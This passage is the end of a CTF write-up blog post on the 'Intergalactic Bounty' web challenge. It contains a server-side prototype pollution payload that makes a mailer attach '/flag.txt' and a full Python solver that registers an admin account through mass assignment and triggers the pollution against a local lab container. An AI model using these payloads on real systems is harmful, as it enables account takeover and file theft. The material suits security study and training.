| <span class="string">&quot;base64&quot;</span> | <span class="string">&quot;quoted-printable&quot;</span> | <span class="literal">false</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** optional content disposition type for the attachment, defaults to ‘attachment’ */</span></span><br><span class="line">        contentDisposition?: <span class="string">&quot;attachment&quot;</span> | <span class="string">&quot;inline&quot;</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** is an object of additional headers */</span></span><br><span class="line">        headers?: <span class="title class_">Headers</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** an optional value that overrides entire node content in the mime message. If used then all other options set for this node are ignored. */</span></span><br><span class="line">        raw?: string | <span class="title class_">Buffer</span> | <span class="title class_">Readable</span> | <span class="title class_">AttachmentLike</span> | <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Cool, we can use this gadget to send the flag to our mail, below is teh final payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;description&#x27;:&#x27;saaa&#x27;,</span><br><span class="line">    &#x27;target_name&#x27;:&#x27;saaa&#x27;,</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;fields&quot;: [],</span><br><span class="line">        &quot;attributes&quot;: [&quot;id&quot;, &quot;email&quot;, &quot;isVerified&quot;, &quot;role&quot;],</span><br><span class="line">        &quot;attachments&quot;: [ </span><br><span class="line">            &#123; </span><br><span class="line">                &quot;filename&quot;: &quot;flag.txt&quot;,</span><br><span class="line">                &quot;path&quot;: &quot;/flag.txt&quot;,</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Result:<br><img src="https://hackmd.io/_uploads/HyDhOMeSye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJTC_GxHJl.png" alt="image"></p>
<p>below is the final solver:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">API</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.base_url = base_url</span><br><span class="line">        <span class="variable language_">self</span>.c = httpx.Client()</span><br><span class="line">        <span class="variable language_">self</span>.verifCode = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendVerifCode</span>(<span class="params">self, email</span>):</span><br><span class="line">        data = &#123;<span class="string">&quot;email&quot;</span>:[email,<span class="string">&quot;test@email.htb&quot;</span>]&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/sendEmail&quot;</span>, json=data).json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">submitVerifCode</span>(<span class="params">self</span>):</span><br><span class="line">        data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;kutikula@interstellar.htb&quot;</span>,<span class="string">&quot;code&quot;</span>:<span class="variable language_">self</span>.verifCode&#125;</span><br><span class="line">        <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/verify&quot;</span>, json=data).json()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Email Verified&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self,email</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/register&quot;</span>, json=&#123;<span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;).json()</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self,</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/login&quot;</span>, json=&#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;kutikula@interstellar.htb&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aa&quot;</span>&#125;)</span><br><span class="line">        token = resp.json().get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.c.headers[<span class="string">&quot;Cookie&quot;</span>] = <span class="string">f&quot;auth=<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;[+] get admin token: <span class="subst">&#123;token&#125;</span>&quot;</span>, token</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getBounty</span>(<span class="params">self, <span class="built_in">id</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.get(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/bounties/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span>).json()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makeBounty</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/bounties&quot;</span>, json=payload).json()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updateBounty</span>(<span class="params">self, <span class="built_in">id</span>, payload</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.put(<span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/api/bounties/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span>, json=&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;approved&quot;</span>, **payload&#125;).json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mail</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deleteAllVerif</span>(<span class="params">self</span>):</span><br><span class="line">        r = httpx.get(<span class="string">&quot;http://localhost:9080/deleteall&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getVerifCode</span>(<span class="params">self</span>):</span><br><span class="line">        response = httpx.get(<span class="string">&quot;http://localhost:9080/&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            td = soup.find(<span class="string">&#x27;td&#x27;</span>, text=<span class="keyword">lambda</span> t: t <span class="keyword">and</span> <span class="string">&#x27;Your verification code is:&#x27;</span> <span class="keyword">in</span> t)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> td:</span><br><span class="line"></span><br><span class="line">                verification_code = td.text.split(<span class="string">&#x27;Your verification code is:&#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">return</span> verification_code</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Verification code not found.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch the page. Status code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">bounty = &#123;<span class="string">&quot;target_name&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;target_aliases&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;target_species&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;last_known_location&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;galaxy&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;star_system&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;planet&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;coordinates&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;reward_credits&quot;</span>:<span class="number">111</span>,<span class="string">&quot;reward_items&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;issuer_name&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;issuer_faction&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;risk_level&quot;</span>:<span class="string">&quot;low&quot;</span>,<span class="string">&quot;image&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;1111&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span>:<span class="string">&#x27;saaa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;target_name&#x27;</span>:<span class="string">&#x27;saaa&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;fields&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;attributes&quot;</span>: [<span class="string">&quot;id&quot;</span>, <span class="string">&quot;email&quot;</span>, <span class="string">&quot;isVerified&quot;</span>, <span class="string">&quot;role&quot;</span>],</span><br><span class="line">        <span class="string">&quot;attachments&quot;</span>: [ </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;flag.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/flag.txt&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            ],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Reset the container because the app tends to broken if we fail to use intended pollute</span></span><br><span class="line">    os.system(<span class="string">&quot;docker rm -f web_intergalatic_bounty&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;docker run --name=web_intergalatic_bounty -d --rm -p1337:1337 -p9080:8080 -it web_intergalatic_bounty&quot;</span>)</span><br><span class="line">    sleep(<span class="number">10</span>)</span><br><span class="line">    api = API(<span class="string">&quot;http://localhost:1337&quot;</span>)</span><br><span class="line">    mail = Mail()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#login as admin, and 1 other user</span></span><br><span class="line">    api.register(<span class="string">&quot;kutikula@interstellar.htb&quot;</span>)</span><br><span class="line">    api.register(<span class="string">&quot;mariaban@interstellar.htb&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#check verify token</span></span><br><span class="line">    mail.deleteAllVerif()</span><br><span class="line">    resp = api.sendVerifCode(<span class="string">&quot;kutikula@interstellar.htb&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.get(<span class="string">&quot;status&quot;</span>) != <span class="number">400</span>:</span><br><span class="line">        api.verifCode = mail.getVerifCode()</span><br><span class="line">        <span class="keyword">if</span> api.verifCode:</span><br><span class="line">            api.submitVerifCode()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    stat, token = api.login()</span><br><span class="line">    <span class="built_in">print</span>(token)</span><br><span class="line">    </span><br><span class="line">    stat = api.makeBounty(bounty)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Trigger Pollution</span></span><br><span class="line">    stat = api.updateBounty(<span class="number">7</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Retrieve the flag</span></span><br><span class="line">    <span class="comment"># mail.deleteAllVerif()</span></span><br><span class="line">    stat = api.sendVerifCode(<span class="string">&quot;mariaban@interstellar.htb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Read The Flag</span></span><br><span class="line">    huzzah = mail.getVerifCode()</span><br><span class="line">    regex = <span class="string">r&#x27;\b[A-Za-z0-9+/]&#123;4,&#125;=&#123;0,2&#125;\b&#x27;</span></span><br><span class="line">    matches = re.findall(regex, huzzah)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            valid = b64decode(<span class="keyword">match</span>, validate=<span class="literal">True</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;HTB&quot;</span> <span class="keyword">in</span> valid: <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;valid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
    </article>
    <!-- license -->
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
                <div class="nextSlogan">Next Post</div>
                <a href="/2025/12/11/ctf/web/SECURINETS2025/" title="Securinets 2025">
                    <div class="nextTitle">Securinets 2025</div>
                </a>
        </li>
        <li class="previous">
                <div class="prevSlogan">Previous Post</div>
                <a href="/2025/12/11/ctf/web/NCW2025/" title="Self-Love NCW 2025">
                    <div class="prevTitle">Self-Love NCW 2025</div>
                </a>
        </li>
    </ul>
    <!-- comment -->
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->

            
            
            
            <!-- utteranc评论 -->

            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->

            
            
            
        </div>
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    <!-- Mathjax -->
</main>

                <!-- profile -->
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
        <div class="social">
                            <a href="//github.com/DJumanto" class="iconfont-archer github" target="_blank" title="github"></a>
                <a href="//www.linkedin.com/in/alfafakhrur/" class="iconfont-archer linkedin" target="_blank" title="linkedin"></a>
                <a href="/DJumanto" class="iconfont-archer discord" target="_blank" title="discord"></a>

        </div>
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    <!-- 不蒜子  -->
        <div class="busuanzi-container">
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
        </div>
</footer>

        </div>
        <!-- toc -->
            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Index"><span class="toc-number">1.</span> <span class="toc-text">Index</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Armaxis"><span class="toc-number">2.</span> <span class="toc-text">Web Armaxis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Information"><span class="toc-number">2.2.</span> <span class="toc-text">Challenge Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-Account-Takeover"><span class="toc-number">2.3.</span> <span class="toc-text">Admin Account Takeover</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">2.4.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Full-Solver"><span class="toc-number">2.5.</span> <span class="toc-text">Full Solver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Breaking"><span class="toc-number">3.</span> <span class="toc-text">Web Breaking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-1"><span class="toc-number">3.1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Introduction"><span class="toc-number">3.2.</span> <span class="toc-text">Challenge Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-Account-Takeover-1"><span class="toc-number">3.3.</span> <span class="toc-text">Admin Account Takeover</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OTP-Broken-Logic"><span class="toc-number">3.4.</span> <span class="toc-text">OTP Broken Logic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Intergalactic-Bounty"><span class="toc-number">4.</span> <span class="toc-text">Web Intergalactic Bounty</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-2"><span class="toc-number">4.1.</span> <span class="toc-text">Vulnerability:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Introduction-1"><span class="toc-number">4.2.</span> <span class="toc-text">Challenge Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-Admin-Access"><span class="toc-number">4.3.</span> <span class="toc-text">Get Admin Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Side-Prototype-Pollution-leads-to-Local-File-Inclusion"><span class="toc-number">4.4.</span> <span class="toc-text">Server-Side Prototype Pollution leads to Local File Inclusion</span></a></li></ol></li></ol>
            </div>
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
        
        
        
        
        
        
    <div class="total-and-search">
        <div class="total-archive">
        Total : 6
        </div>
        <!-- search  -->
    </div>
    <div class="post-archive">
            <div class="archive-year"> 2025 </div>
            <ul class="year-list">
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/CJN2024/">Cyberjawara National 2024 Quals</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/AMATEURS2025/">Amateurs 2025</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/HACKTODAY2025/">Hacktoday 2025</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/NCW2025/">Self-Love NCW 2025</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/SECURINETS2025/">Securinets 2025</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2025/12/11/ctf/web/HTBUNIVCTF2024/">HTB University CTF 2024</a>
        </li>
            </ul>
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
            <span class="sidebar-tag-name" data-tags="WEB">
                <span class="iconfont-archer">&#xe606;</span>
                WEB
            </span>
            <span class="sidebar-tag-name" data-tags="CRLF INJECTION">
                <span class="iconfont-archer">&#xe606;</span>
                CRLF INJECTION
            </span>
            <span class="sidebar-tag-name" data-tags="XS-LEAKS">
                <span class="iconfont-archer">&#xe606;</span>
                XS-LEAKS
            </span>
            <span class="sidebar-tag-name" data-tags="RCE">
                <span class="iconfont-archer">&#xe606;</span>
                RCE
            </span>
            <span class="sidebar-tag-name" data-tags="XSS">
                <span class="iconfont-archer">&#xe606;</span>
                XSS
            </span>
            <span class="sidebar-tag-name" data-tags="MASS ASSIGNMENT">
                <span class="iconfont-archer">&#xe606;</span>
                MASS ASSIGNMENT
            </span>
            <span class="sidebar-tag-name" data-tags="XXE">
                <span class="iconfont-archer">&#xe606;</span>
                XXE
            </span>
            <span class="sidebar-tag-name" data-tags="IDOR">
                <span class="iconfont-archer">&#xe606;</span>
                IDOR
            </span>
            <span class="sidebar-tag-name" data-tags="BROKEN ACCESS CONTROL">
                <span class="iconfont-archer">&#xe606;</span>
                BROKEN ACCESS CONTROL
            </span>
            <span class="sidebar-tag-name" data-tags="CLIENT SIDE PATH TRAVERSAL">
                <span class="iconfont-archer">&#xe606;</span>
                CLIENT SIDE PATH TRAVERSAL
            </span>
            <span class="sidebar-tag-name" data-tags="SQL INJECTION">
                <span class="iconfont-archer">&#xe606;</span>
                SQL INJECTION
            </span>
            <span class="sidebar-tag-name" data-tags="JWT">
                <span class="iconfont-archer">&#xe606;</span>
                JWT
            </span>
            <span class="sidebar-tag-name" data-tags="PROTOTYPE POLLUTION">
                <span class="iconfont-archer">&#xe606;</span>
                PROTOTYPE POLLUTION
            </span>
            <span class="sidebar-tag-name" data-tags="COMMAND INJECTION">
                <span class="iconfont-archer">&#xe606;</span>
                COMMAND INJECTION
            </span>
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "http://example.com",
        root: siteMetaRoot,
        author: "DJumanto"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->

        <!-- main func -->
        <script src="/scripts/main.js"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
        <!-- algolia -->
        <!-- busuanzi -->
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        <!-- async load share.js -->
            <script src="/scripts/share.js" async></script>
        <!-- mermaid -->
    </body>
</html>
